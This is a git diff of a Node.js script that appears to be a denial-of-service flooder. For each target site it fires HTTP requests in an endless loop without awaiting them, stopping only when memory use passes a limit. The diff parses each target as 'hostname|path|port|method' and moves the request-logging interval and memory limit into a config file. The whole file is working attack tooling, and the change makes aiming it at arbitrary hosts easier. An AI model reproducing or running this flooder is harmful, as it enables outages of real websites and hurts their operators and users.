@@ -1,40 +1,38 @@
+const { NEXT_REQUEST_LOG, MAX_MEM_USE } = require('../../config.settings');
 const { currentMEMUsege } = require('../helpers/cpu.helper');
+const { sleep } = require('../helpers/sleep.helper');
 const { RequestApi } = require('../utils/api.util');
 
-const NEXT_REQUEST_LOG = 5000;
-let canRun = true;
-
-async function start(sites) {
-  for (const site of sites) {
-    run(site);
+console.log(NEXT_REQUEST_LOG, MAX_MEM_USE);
+async function start(sitesData) {
+  for (const siteData of sitesData) {
+    run(siteData);
   }
 }
 
 /**
- *
- * @param {string} site
+ * @param {string} siteData
  */
-async function run(site) {
+async function run(siteData) {
   let requests = 0;
   let nextLogRequestCount = NEXT_REQUEST_LOG;
 
-  site = site.split('/');
-  site = site[site.length - 2];
+  const [hostname, path, port, method] = siteData.split('|');
 
   while (true) {
     new RequestApi()
       .options({
-        hostname: site,
-        port: 443,
-        path: '/',
-        method: 'GET',
+        hostname,
+        port,
+        path,
+        method,
         timeout: 1000,
       })
       .make()
       .catch((err) => err);
 
     if (requests === nextLogRequestCount) {
-      await checkMEMUsage(site, requests);
+      await checkMEMUsage(hostname, requests);
       nextLogRequestCount += NEXT_REQUEST_LOG;
     }
 
@@ -46,10 +44,10 @@ async function checkMEMUsage(site, requests) {
   const memUsage = currentMEMUsege();
 
   console.log(
-    `Site | ${site} | Requests maked | ${requests} | Free MEM | ${memUsage} | Time | ${new Date().getSeconds()}`
+    `Site | ${site} | Requests maked | ${requests} | MEM used | ${memUsage} | Time | ${new Date().getSeconds()}`
   );
 
-  if (canRun && memUsage > 1500) {
+  if (memUsage > MAX_MEM_USE) {
     process.exit(1);
   }
 }
